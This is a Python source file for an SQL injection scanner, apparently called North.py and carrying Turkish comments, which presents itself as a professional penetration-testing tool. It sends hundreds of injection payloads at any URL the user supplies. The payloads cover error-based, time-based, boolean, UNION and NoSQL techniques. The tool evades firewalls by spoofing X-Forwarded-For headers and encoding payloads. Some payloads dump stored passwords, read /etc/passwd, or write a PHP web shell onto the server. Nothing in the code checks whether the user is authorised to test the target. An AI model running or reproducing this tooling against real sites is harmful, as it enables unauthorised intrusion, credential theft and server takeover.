#!/usr/bin/env python3
"""
Advanced SQL Injection Testing Framework 
Professional penetration testing SQL injection scanner


python North.py
Target URL:
Example: http://testphp.vulnweb.com/artists.php?artist=1

"""

import requests
import urllib.parse
import time
import sys
import os
import re
import base64
import hashlib
import json
import random
import string
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote, unquote
import warnings
warnings.filterwarnings('ignore')

# ============================================
# ANSI COLOR CODES
# ============================================
class Colors:
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[0;34m'
    MAGENTA = '\033[0;35m'
    CYAN = '\033[0;36m'
    WHITE = '\033[1;37m'
    BOLD = '\033[1m'
    NC = '\033[0m'

# ============================================
# BANNER
# ============================================
BANNER = f"""
{Colors.CYAN}╔══════════════════════════════════════════════════════════════╗
║  Advanced SQL Injection Testing Framework v3.0              ║
║  Professional Security Testing Tool                         ║
║  Multi-Database | WAF Bypass | Encoding | Obfuscation      ║
╚══════════════════════════════════════════════════════════════╝{Colors.NC}
"""

# ============================================
# CONFIGURATION
# ============================================
class Config:
    THREADS = 10
    TIMEOUT = 8
    DELAY = 0.05
    MAX_RETRIES = 2
    TIME_BASED_DELAY = 5
    USER_AGENTS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0'
    ]

# ============================================
# ADVANCED PAYLOAD GENERATOR
# ============================================
class PayloadGenerator:
    
    @staticmethod
    def generate_encoded_payloads(base_payload):
        """Çoklu encoding teknikleri ile payload üret"""
        encoded = []
        
        # URL Encoding
        encoded.append(quote(base_payload))
        
        # Double URL Encoding
        encoded.append(quote(quote(base_payload)))
        
        # Base64 Encoding
        try:
            b64 = base64.b64encode(base_payload.encode()).decode()
            encoded.append(b64)
        except:
            pass
        
        # Hex Encoding
        hex_payload = '0x' + base_payload.encode().hex()
        encoded.append(hex_payload)
        
        # Unicode Encoding
        unicode_payload = ''.join([f'\\u{ord(c):04x}' for c in base_payload])
        encoded.append(unicode_payload)
        
        # Mixed Case
        encoded.append(''.join(random.choice([c.upper(), c.lower()]) for c in base_payload))
        
        return encoded

    @staticmethod
    def generate_waf_bypass_payloads():
        """WAF bypass için özel payloadlar"""
        return [
            # Comment-based obfuscation
            "1'/**/AND/**/1=1--",
            "1'/**/OR/**/1=1--",
            "1'/*!50000AND*/1=1--",
            "1'%0AAND%0A1=1--",
            
            # Space bypass
            "1'AND(1)=(1)--",
            "1'AND+1=1--",
            "1'AND/**/1=1--",
            "1'%09AND%091=1--",
            "1'%0DAND%0D1=1--",
            
            # Case manipulation
            "1'AnD'1'='1",
            "1'oR'1'='1",
            "1'UnIoN SeLeCt",
            
            # Inline comments
            "1'/**/UNION/*!50000SELECT*/--",
            "1'UNION/*!12345SELECT*/--",
            "1'/*!UNION*//*!SELECT*/--",
            
            # Null byte injection
            "1'%00AND%001=1--",
            "1'%00'%00OR%00'1'='1",
            
            # Character encoding
            "1'%41%4e%44%20%31%3d%31--",
            "1'&#65;&#78;&#68;&#32;1=1--",
            
            # Scientific notation
            "1e0'AND'1e0'='1e0",
            
            # Concatenation bypass
            "1'||'1'='1",
            "1'+or+'1'='1",
            
            # Advanced WAF evasion
            "1'and(1)like(1)--",
            "1'/*!50000%55nIoN*/%0A/*!50000%53eLeCt*/--",
            "1'UnI/**/On+Se/**/LeCt--",
            "1'%55nion(%53elect%201,2,3)--",
            
            # Newline/tab injection
            "1'\nAND\n1=1--",
            "1'\tAND\t1=1--",
            "1'\rAND\r1=1--",
            
            # Parenthesis bypass
            "1'AND(SELECT(1))--",
            "1'AND(1)IN(1)--",
            
            # Function-based bypass
            "1'AND+ASCII(SUBSTRING(@@version,1,1))>50--",
            "1'AND+CHAR(65)='A'--",
            
            # HPP (HTTP Parameter Pollution)
            "1&id=1'AND'1'='1",
            
            # JSON injection
            "1')||JSON_EXTRACT('{}','$')--",
        ]

    @staticmethod
    def generate_time_based_payloads():
        """Gelişmiş time-based blind payloadlar"""
        delay = Config.TIME_BASED_DELAY
        return [
            # MySQL
            f"1'AND(SELECT*FROM(SELECT(SLEEP({delay})))a)--",
            f"1'AND+SLEEP({delay})--",
            f"1'AND+BENCHMARK(5000000,MD5('A'))--",
            f"1'AND+IF(1=1,SLEEP({delay}),0)--",
            f"1'AND+(SELECT*FROM(SELECT(SLEEP({delay})))a)--",
            f"1'/**/AND/**/SLEEP({delay})--",
            f"1'RLIKE(SELECT(SLEEP({delay})))--",
            
            # PostgreSQL
            f"1'AND+pg_sleep({delay})--",
            f"1'AND+(SELECT+pg_sleep({delay}))--",
            f"1'||(SELECT+pg_sleep({delay}))--",
            
            # MSSQL
            f"1';WAITFOR+DELAY+'0:0:{delay}'--",
            f"1'AND+1=(SELECT+1+FROM+(SELECT+SLEEP({delay}))a)--",
            f"1';DECLARE+@q+VARCHAR(99);SET+@q='WAITFOR+DELAY+''0:0:{delay}''';EXEC(@q)--",
            
            # Oracle
            f"1'AND+DBMS_LOCK.SLEEP({delay})--",
            f"1'AND+(SELECT+COUNT(*)+FROM+ALL_USERS+WHERE+ROWNUM<={delay}000)>0--",
            
            # SQLite
            f"1'AND+randomblob({delay}00000000)--",
            
            # Heavy query based
            f"1'AND+(SELECT+COUNT(*)+FROM+information_schema.tables+A,information_schema.tables+B)--",
        ]

    @staticmethod
    def generate_union_based_payloads():
        """Gelişmiş UNION-based payloadlar"""
        payloads = []
        
        # Column number detection (1-20 columns)
        for i in range(1, 21):
            nulls = ','.join(['NULL'] * i)
            payloads.append(f"1'UNION+SELECT+{nulls}--")
            payloads.append(f"-1'UNION+SELECT+{nulls}--")
            payloads.append(f"1'UNION+ALL+SELECT+{nulls}--")
            
        # Data extraction
        info_payloads = [
            "1'UNION+SELECT+@@version,NULL,NULL--",
            "1'UNION+SELECT+user(),database(),version()--",
            "1'UNION+SELECT+table_name,NULL,NULL+FROM+information_schema.tables--",
            "1'UNION+SELECT+column_name,NULL,NULL+FROM+information_schema.columns--",
            "1'UNION+SELECT+group_concat(username),group_concat(password),NULL+FROM+users--",
            "1'UNION+SELECT+load_file('/etc/passwd'),NULL,NULL--",
            "1'UNION+SELECT+'<?php+system($_GET[0]);?>',NULL,NULL+INTO+OUTFILE+'/var/www/html/shell.php'--",
            
            # Encoded versions
            "1'/**/UNION/**/SELECT/**/@@version,NULL,NULL--",
            "1'%0AUNION%0ASELECT%0A@@version,NULL,NULL--",
            "1'/*!50000UNION*//*!50000SELECT*/@@version,NULL,NULL--",
            
            # Database fingerprinting
            "1'UNION+SELECT+sqlite_version(),NULL,NULL--",
            "1'UNION+SELECT+version(),NULL,NULL+FROM+v$instance--",
            "1'UNION+SELECT+@@version,NULL,NULL--",
        ]
        
        payloads.extend(info_payloads)
        return payloads

    @staticmethod
    def generate_boolean_based_payloads():
        """Gelişmiş Boolean-based blind payloadlar"""
        return [
            # Basic boolean
            "1'AND'1'='1",
            "1'AND'1'='2",
            "1'AND+1=1--",
            "1'AND+1=2--",
            
            # Advanced boolean
            "1'AND+(SELECT+1)=1--",
            "1'AND+(SELECT+1)=2--",
            "1'AND+EXISTS(SELECT+1)--",
            "1'AND+NOT+EXISTS(SELECT+1+WHERE+1=2)--",
            
            # Substring extraction
            "1'AND+ASCII(SUBSTRING((SELECT+password+FROM+users+LIMIT+1),1,1))>100--",
            "1'AND+ASCII(SUBSTRING((SELECT+password+FROM+users+LIMIT+1),1,1))<100--",
            "1'AND+LENGTH((SELECT+password+FROM+users+LIMIT+1))>5--",
            
            # Conditional responses
            "1'AND+IF(1=1,1,0)--",
            "1'AND+IF(1=2,1,0)--",
            "1'AND+(SELECT+CASE+WHEN(1=1)+THEN+1+ELSE+0+END)--",
            
            # Bitwise operations
            "1'AND+1&1--",
            "1'AND+1|0--",
            
            # Mathematical operations
            "1'AND+1*1=1--",
            "1'AND+1*0=0--",
            "1'AND+POW(1,1)=1--",
        ]

    @staticmethod
    def generate_error_based_payloads():
        """Gelişmiş Error-based payloadlar"""
        return [
            # MySQL
            "1'AND+extractvalue(1,concat(0x7e,version()))--",
            "1'AND+updatexml(1,concat(0x7e,database()),1)--",
            "1'AND+exp(~(SELECT+*+FROM(SELECT+user())a))--",
            "1'AND+(SELECT+1+FROM(SELECT+COUNT(*),CONCAT((SELECT+@@version),0x3a,FLOOR(RAND(0)*2))x+FROM+information_schema.tables+GROUP+BY+x)a)--",
            "1'AND+GeometryCollection((SELECT+*+FROM(SELECT+*+FROM(SELECT+@@version)a)b))--",
            "1'AND+polygon((SELECT+*+FROM(SELECT+*+FROM(SELECT+@@version)a)b))--",
            "1'AND+multipoint((SELECT+*+FROM(SELECT+*+FROM(SELECT+@@version)a)b))--",
            
            # MSSQL
            "1'AND+1=CONVERT(int,@@version)--",
            "1'AND+1=CAST((SELECT+@@version)+AS+int)--",
            "1'AND+1=(SELECT+TOP+1+name+FROM+master..sysdatabases+WHERE+name+NOT+IN(SELECT+TOP+0+name+FROM+master..sysdatabases))--",
            
            # PostgreSQL
            "1'AND+1=CAST(version()+AS+int)--",
            "1'AND+1=CAST((SELECT+current_database())+AS+int)--",
            
            # Oracle
            "1'AND+1=UTL_INADDR.get_host_name((SELECT+user+FROM+dual))--",
            "1'AND+1=CTXSYS.DRITHSX.SN(1,(SELECT+user+FROM+dual))--",
            
            # SQLite
            "1'AND+1=likelihood(1,1.1)--",
        ]

    @staticmethod
    def generate_second_order_payloads():
        """Second-order SQL injection payloadlar"""
        return [
            "admin'--",
            "admin'/*",
            "admin'#",
            "admin'||'",
            "test'+UNION+SELECT+NULL,NULL,NULL--",
            "user123'+AND+'1'='1",
            "' UNION SELECT 'injected',NULL,NULL--",
        ]

    @staticmethod
    def generate_nosql_payloads():
        """NoSQL injection payloadlar (MongoDB vb.)"""
        return [
            "{'$ne': null}",
            "{'$ne': ''}",
            "{'$gt': ''}",
            "{'$regex': '.*'}",
            "{'$where': 'sleep(5000)'}",
            "admin'||'1'=='1",
            "admin'&&'1'=='1",
            "{username: {$ne: null}, password: {$ne: null}}",
            "{$or: [{}, {username: 'admin'}]}",
        ]

# ============================================
# PAYLOAD ENCODER/OBFUSCATOR
# ============================================
class PayloadEncoder:
    
    @staticmethod
    def url_encode(payload):
        return quote(payload)
    
    @staticmethod
    def double_url_encode(payload):
        return quote(quote(payload))
    
    @staticmethod
    def base64_encode(payload):
        return base64.b64encode(payload.encode()).decode()
    
    @staticmethod
    def hex_encode(payload):
        return '0x' + payload.encode().hex()
    
    @staticmethod
    def unicode_encode(payload):
        return ''.join([f'\\u{ord(c):04x}' for c in payload])
    
    @staticmethod
    def html_entity_encode(payload):
        return ''.join([f'&#{ord(c)};' for c in payload])
    
    @staticmethod
    def random_case(payload):
        return ''.join(random.choice([c.upper(), c.lower()]) for c in payload)
    
    @staticmethod
    def add_comments(payload):
        """SQL comments ekle"""
        keywords = ['AND', 'OR', 'UNION', 'SELECT', 'FROM', 'WHERE']
        for kw in keywords:
            payload = payload.replace(kw, f'/**/{kw}/**/')
        return payload
    
    @staticmethod
    def add_null_bytes(payload):
        """Null byte injection"""
        return payload.replace(' ', '%00')
    
    @staticmethod
    def encode_all(payload):
        """Tüm encoding tekniklerini uygula"""
        encodings = [
            ('url', PayloadEncoder.url_encode),
            ('double_url', PayloadEncoder.double_url_encode),
            ('base64', PayloadEncoder.base64_encode),
            ('hex', PayloadEncoder.hex_encode),
            ('unicode', PayloadEncoder.unicode_encode),
            ('html', PayloadEncoder.html_entity_encode),
            ('random_case', PayloadEncoder.random_case),
            ('comments', PayloadEncoder.add_comments),
        ]
        
        results = {}
        for name, func in encodings:
            try:
                results[name] = func(payload)
            except:
                results[name] = payload
        
        return results

# ============================================
# WAF DETECTOR
# ============================================
class WAFDetector:
    
    WAF_SIGNATURES = {
        'Cloudflare': ['cloudflare', 'cf-ray', '__cfduid'],
        'AWS WAF': ['x-amzn-requestid', 'x-amz-cf-id'],
        'Akamai': ['akamai', 'x-akamai'],
        'Imperva': ['incapsula', '_incap_'],
        'ModSecurity': ['mod_security', 'NOYB'],
        'F5 BIG-IP': ['bigip', 'f5-'],
        'Barracuda': ['barra', 'barracuda'],
        'Sucuri': ['sucuri', 'x-sucuri'],
        'Wordfence': ['wordfence'],
        'WebKnight': ['webknight'],
    }
    
    @staticmethod
    def detect(response, headers):
        """WAF detection"""
        detected_wafs = []
        
        # Header-based detection
        for waf_name, signatures in WAFDetector.WAF_SIGNATURES.items():
            for sig in signatures:
                for header, value in headers.items():
                    if sig.lower() in header.lower() or sig.lower() in str(value).lower():
                        detected_wafs.append(waf_name)
                        break
        
        # Response body-based detection
        body_lower = response.lower()
        for waf_name, signatures in WAFDetector.WAF_SIGNATURES.items():
            for sig in signatures:
                if sig.lower() in body_lower:
                    if waf_name not in detected_wafs:
                        detected_wafs.append(waf_name)
        
        return detected_wafs

# ============================================
# DATABASE FINGERPRINTER
# ============================================
class DBFingerprinter:
    
    ERROR_PATTERNS = {
        'MySQL': [
            r'SQL syntax.*MySQL',
            r'Warning.*mysql_',
            r'MySQLSyntaxErrorException',
            r'valid MySQL result',
            r'check the manual that corresponds to your MySQL',
            r'MySqlException',
        ],
        'PostgreSQL': [
            r'PostgreSQL.*ERROR',
            r'Warning.*\Wpg_',
            r'valid PostgreSQL result',
            r'Npgsql\.',
            r'PG::SyntaxError',
            r'org.postgresql.util.PSQLException',
        ],
        'MSSQL': [
            r'Driver.*SQL[\-\_\ ]*Server',
            r'OLE DB.*SQL Server',
            r'\[Microsoft\]\[ODBC SQL Server Driver\]',
            r'\[SQL Server\]',
            r'System.Data.SqlClient.SqlException',
            r'Unclosed quotation mark after the character string',
        ],
        'Oracle': [
            r'\bORA-\d{4,5}',
            r'Oracle error',
            r'Oracle.*Driver',
            r'Warning.*\Woci_',
            r'oracle.jdbc.driver',
        ],
        'SQLite': [
            r'SQLite/JDBCDriver',
            r'SQLite.Exception',
            r'System.Data.SQLite.SQLiteException',
            r'Warning.*sqlite_',
            r'SQLite3::',
        ],
        'MongoDB': [
            r'MongoDB',
            r'MongoException',
            r'com.mongodb',
        ],
    }
    
    @staticmethod
    def identify(response_text):
        """Veritabanı tipini tespit et"""
        databases = []
        for db_type, patterns in DBFingerprinter.ERROR_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    if db_type not in databases:
                        databases.append(db_type)
        return databases

# ============================================
# LOGGER
# ============================================
class AdvancedLogger:
    def __init__(self, output_dir):
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)
        self.log_file = f"{output_dir}/scan.log"
        self.vuln_file = f"{output_dir}/vulnerabilities.json"
        self.report_file = f"{output_dir}/REPORT.txt"
        self.vulnerabilities = []
    
    def log(self, message, level="INFO"):
        timestamp = datetime.now().strftime('%H:%M:%S')
        color_map = {
            "INFO": Colors.BLUE,
            "SUCCESS": Colors.GREEN,
            "WARNING": Colors.YELLOW,
            "ERROR": Colors.RED,
            "VULN": Colors.MAGENTA,
            "WAF": Colors.CYAN
        }
        color = color_map.get(level, Colors.NC)
        
        formatted = f"[{timestamp}] [{level:7}] {message}"
        print(f"{color}{formatted}{Colors.NC}")
        
        with open(self.log_file, 'a', encoding='utf-8') as f:
            f.write(formatted + '\n')
    
    def add_vulnerability(self, vuln_data):
        self.vulnerabilities.append(vuln_data)
        with open(self.vuln_file, 'w', encoding='utf-8') as f:
            json.dump(self.vulnerabilities, f, indent=2, ensure_ascii=False)
    
    def generate_report(self, scan_time, total_payloads, target_url):
        """Detaylı rapor oluştur"""
        report = []
        report.append("="*80)
        report.append("   ADVANCED SQL INJECTION SCAN REPORT")
        report.append("="*80)
        report.append(f"Target URL    : {target_url}")
        report.append(f"Scan Date     : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report.append(f"Total Time    : {scan_time:.2f} seconds")
        report.append(f"Payloads Tested: {total_payloads}")
        report.append(f"Vulnerabilities: {len(self.vulnerabilities)}")
        report.append("="*80)
        report.append("")
        
        if self.vulnerabilities:
            report.append("DETECTED VULNERABILITIES:")
            report.append("-"*80)
            for i, vuln in enumerate(self.vulnerabilities, 1):
                report.append(f"\n[{i}] {vuln.get('type', 'Unknown')}")
                report.append(f"    Parameter  : {vuln.get('parameter')}")
                report.append(f"    Payload    : {vuln.get('payload')[:100]}...")
                report.append(f"    Database   : {vuln.get('database', 'Unknown')}")
                report.append(f"    Encoding   : {vuln.get('encoding', 'None')}")
                if 'response_time' in vuln:
                    report.append(f"    Response   : {vuln.get('response_time')}")
                report.append("")
        else:
            report.append("✓ No SQL injection vulnerabilities detected.")
        
        report.append("\n" + "="*80)
        
        report_text = '\n'.join(report)
        
        with open(self.report_file, 'w', encoding='utf-8') as f:
            f.write(report_text)
        
        print(f"\n{Colors.GREEN}Report saved: {self.report_file}{Colors.NC}")
        return report_text

# ============================================
# ADVANCED SQL INJECTION SCANNER
# ============================================
class AdvancedSQLiScanner:
    def __init__(self, target_url, logger):
        self.target_url = target_url
        self.logger = logger
        self.session = requests.Session()
        self.session.verify = False
        self.total_payloads = 0
        self.vulnerabilities = []
        
        # Baseline response
        self.baseline_response = None
        self.baseline_time = None
        
    def randomize_headers(self):
        """Random headers ile WAF bypass"""
        headers = {
            'User-Agent': random.choice(Config.USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Referer': self.target_url,
        }
        
        # Random additional headers for WAF bypass
        random_headers = [
            ('X-Forwarded-For', f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'),
            ('X-Originating-IP', f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'),
            ('X-Remote-IP', f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'),
            ('X-Client-IP', f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'),
        ]
        
        for header, value in random.sample(random_headers, k=2):
            headers[header] = value
        
        return headers
    
    def get_baseline(self, base_url, params):
        """Baseline response al"""
        try:
            response = self.session.get(
                base_url,
                params=params,
                headers=self.randomize_headers(),
                timeout=Config.TIMEOUT
            )
            self.baseline_response = response.text
            self.baseline_time = response.elapsed.total_seconds()
            return response
        except:
            return None
    
    def detect_waf(self):
        """WAF detection"""
        self.logger.log("WAF detection...", "INFO")
        try:
            # Malicious payload gönder
            test_payload = "' OR '1'='1"
            parsed = urllib.parse.urlparse(self.target_url)
            params = urllib.parse.parse_qs(parsed.query)
            
            if params:
                first_param = list(params.keys())[0]
                params[first_param] = test_payload
                
                base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                response = self.session.get(
                    base_url,
                    params=params,
                    headers=self.randomize_headers(),
                    timeout=Config.TIMEOUT
                )
                
                detected_wafs = WAFDetector.detect(response.text, response.headers)
                
                if detected_wafs:
                    self.logger.log(f"WAF Detected: {', '.join(detected_wafs)}", "WAF")
                    return detected_wafs
                else:
                    self.logger.log("No WAF detected", "SUCCESS")
                    return []
        except:
            return []
    
    def test_payload(self, base_url, params, param_name, payload, payload_type, encoding_type="none"):
        """Payload testi"""
        self.total_payloads += 1
        
        test_params = params.copy()
        test_params[param_name] = [payload]
        
        headers = self.randomize_headers()
        
        try:
            start_time = time.time()
            response = self.session.get(
                base_url,
                params=test_params,
                headers=headers,
                timeout=Config.TIMEOUT,
                allow_redirects=False
            )
            elapsed = time.time() - start_time
            
            # Error-based detection
            detected_dbs = DBFingerprinter.identify(response.text)
            if detected_dbs:
                for db in detected_dbs:
                    vuln = {
                        'type': f'Error-Based SQL Injection ({db})',
                        'parameter': param_name,
                        'payload': payload,
                        'database': db,
                        'encoding': encoding_type,
                        'status_code': response.status_code,
                        'response_length': len(response.text),
                        'timestamp': datetime.now().isoformat()
                    }
                    return vuln
            
            # Time-based detection
            if payload_type == 'TIME_BASED' and elapsed > (Config.TIME_BASED_DELAY - 1):
                vuln = {
                    'type': 'Time-Based Blind SQL Injection',
                    'parameter': param_name,
                    'payload': payload,
                    'encoding': encoding_type,
                    'response_time': f'{elapsed:.2f}s',
                    'expected_delay': f'{Config.TIME_BASED_DELAY}s',
                    'timestamp': datetime.now().isoformat()
                }
                return vuln
            
            # Boolean-based detection (response difference)
            if payload_type == 'BOOLEAN_BASED' and self.baseline_response:
                if len(response.text) != len(self.baseline_response):
                    diff = abs(len(response.text) - len(self.baseline_response))
                    if diff > 100:  # Significant difference
                        vuln = {
                            'type': 'Boolean-Based Blind SQL Injection',
                            'parameter': param_name,
                            'payload': payload,
                            'encoding': encoding_type,
                            'length_difference': diff,
                            'timestamp': datetime.now().isoformat()
                        }
                        return vuln
            
            # UNION-based detection
            if payload_type == 'UNION_BASED':
                # Check for data leakage patterns
                patterns = [
                    r'root:.*:0:0:',  # /etc/passwd
                    r'MySQL.*\d+\.\d+\.\d+',  # MySQL version
                    r'PostgreSQL.*\d+\.\d+',  # PostgreSQL version
                    r'Microsoft SQL Server',  # MSSQL
                ]
                for pattern in patterns:
                    if re.search(pattern, response.text):
                        vuln = {
                            'type': 'UNION-Based SQL Injection',
                            'parameter': param_name,
                            'payload': payload,
                            'encoding': encoding_type,
                            'evidence': pattern,
                            'timestamp': datetime.now().isoformat()
                        }
                        return vuln
            
            return None
            
        except requests.exceptions.Timeout:
            if payload_type == 'TIME_BASED':
                vuln = {
                    'type': 'Time-Based Blind SQL Injection (Timeout)',
                    'parameter': param_name,
                    'payload': payload,
                    'encoding': encoding_type,
                    'timestamp': datetime.now().isoformat()
                }
                return vuln
            return None
        except Exception as e:
            return None
    
    def scan_parameter(self, base_url, params, param_name):
        """Parametre taraması"""
        self.logger.log(f"Scanning parameter: {param_name}", "INFO")
        
        # Payload kategorileri
        payload_categories = [
            ('ERROR_BASED', PayloadGenerator.generate_error_based_payloads()),
            ('WAF_BYPASS', PayloadGenerator.generate_waf_bypass_payloads()),
            ('TIME_BASED', PayloadGenerator.generate_time_based_payloads()),
            ('BOOLEAN_BASED', PayloadGenerator.generate_boolean_based_payloads()),
            ('UNION_BASED', PayloadGenerator.generate_union_based_payloads()),
        ]
        
        for category_name, payloads in payload_categories:
            self.logger.log(f"  Testing {category_name}: {len(payloads)} payloads", "INFO")
            
            for payload in payloads:
                # Original payload test
                result = self.test_payload(base_url, params, param_name, payload, category_name)
                if result:
                    self.logger.log(f"✓ VULNERABILITY FOUND!", "VULN")
                    self.logger.log(f"  Type: {result['type']}", "VULN")
                    self.logger.add_vulnerability(result)
                    self.vulnerabilities.append(result)
                    continue
                
                # Encoded payload tests
                encoded_payloads = PayloadGenerator.generate_encoded_payloads(payload)
                for enc_payload in encoded_payloads[:3]:  # İlk 3 encoding
                    result = self.test_payload(base_url, params, param_name, enc_payload, category_name, "encoded")
                    if result:
                        self.logger.log(f"✓ VULNERABILITY FOUND (Encoded)!", "VULN")
                        self.logger.add_vulnerability(result)
                        self.vulnerabilities.append(result)
                        break
                
                time.sleep(Config.DELAY)
    
    def scan(self):
        """Ana tarama fonksiyonu"""
        scan_start = time.time()
        
        self.logger.log("="*60, "INFO")
        self.logger.log("ADVANCED SQL INJECTION SCAN STARTED", "INFO")
        self.logger.log("="*60, "INFO")
        self.logger.log(f"Target: {self.target_url}", "INFO")
        
        # URL parse
        parsed = urllib.parse.urlparse(self.target_url)
        params = urllib.parse.parse_qs(parsed.query)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        if not params:
            self.logger.log("No parameters found in URL!", "ERROR")
            return
        
        self.logger.log(f"Parameters found: {', '.join(params.keys())}", "SUCCESS")
        
        # WAF Detection
        detected_wafs = self.detect_waf()
        
        # Baseline al
        self.logger.log("Getting baseline response...", "INFO")
        self.get_baseline(base_url, params)
        
        # Her parametre için tarama
        for param_name in params.keys():
            self.scan_parameter(base_url, params, param_name)
        
        scan_time = time.time() - scan_start
        
        # Rapor oluştur
        self.logger.log("="*60, "INFO")
        self.logger.log("SCAN COMPLETED", "SUCCESS")
        self.logger.log("="*60, "INFO")
        self.logger.log(f"Total time: {scan_time:.2f}s", "INFO")
        self.logger.log(f"Payloads tested: {self.total_payloads}", "INFO")
        self.logger.log(f"Vulnerabilities found: {len(self.vulnerabilities)}", "VULN" if self.vulnerabilities else "SUCCESS")
        
        self.logger.generate_report(scan_time, self.total_payloads, self.target_url)

# ============================================
# MAIN
# ============================================
def main():
    print(BANNER)
    
    print(f"{Colors.YELLOW}Target URL:{Colors.NC}")
    print(f"{Colors.WHITE}Example: http://testphp.vulnweb.com/artists.php?artist=1{Colors.NC}")
    
    user_url = input(f"{Colors.CYAN}> {Colors.NC}").strip()
    
    if not user_url:
        print(f"{Colors.RED}URL required!{Colors.NC}")
        sys.exit(1)
    
    # Validate URL
    if not user_url.startswith(('http://', 'https://')):
        print(f"{Colors.RED}Invalid URL! Must start with http:// or https://{Colors.NC}")
        sys.exit(1)
    
    # Output directory
    output_dir = f"sqli_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    
    print(f"\n{Colors.GREEN}Starting scan...{Colors.NC}\n")
    
    # Scanner başlat
    logger = AdvancedLogger(output_dir)
    scanner = AdvancedSQLiScanner(user_url, logger)
    
    try:
        scanner.scan()
    except KeyboardInterrupt:
        logger.log("\nScan interrupted by user", "WARNING")
    except Exception as e:
        logger.log(f"Error: {str(e)}", "ERROR")
        import traceback
        traceback.print_exc()
    
    print(f"\n{Colors.CYAN}{'='*60}{Colors.NC}")
    print(f"{Colors.GREEN}Results saved in: {output_dir}{Colors.NC}")
    print(f"{Colors.CYAN}{'='*60}{Colors.NC}\n")

if __name__ == "__main__":
    main()
